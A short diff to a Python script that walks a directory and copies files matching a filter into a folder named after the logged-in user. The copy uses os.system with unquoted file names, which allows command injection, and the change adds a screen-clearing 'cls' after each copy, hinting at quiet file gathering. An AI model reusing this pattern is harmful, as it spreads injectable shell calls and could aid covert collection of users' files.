@@ -33,17 +33,19 @@ def valid(name):
 	if ''.join(temp) in files:
 		return True
 	return False
-	
+
+locations = []
 path=getPath()
 try:
 	mkdir(getlogin())
-except FileExistsError:
+except (FileExistsError):
 	pass
 for roots,dirs,files in walk(path):
 	for name in files:
 		if valid(name):
 			if uname()[0] == "Linux":
-				system('cp %s/%s %s/%s' % (roots,name,getlogin(),name))
+				system(('cp %s/%s %s/%s' % (roots,name,getlogin(),name)))
 			else:
-				system('copy %s\\%s %s\\%s' % (roots,name,getlogin(),name))
+				system(('copy %s\\%s %s\\%s && cls' % (roots,name,getlogin(),name)))
+
 warnMe()
